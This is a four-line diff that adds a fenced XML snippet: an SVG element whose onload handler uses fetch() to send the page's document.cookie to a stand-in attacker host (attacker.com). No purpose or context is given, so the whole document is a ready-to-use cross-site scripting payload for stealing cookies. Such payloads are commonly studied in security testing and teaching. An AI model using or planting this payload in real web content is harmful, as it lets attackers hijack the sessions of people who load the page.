@@ -1,0 +1,4 @@
+```xml
+<svg onload="fetch('http://attacker.com/steal-cookie?cookie=' + document.cookie)">
+</svg>
+```
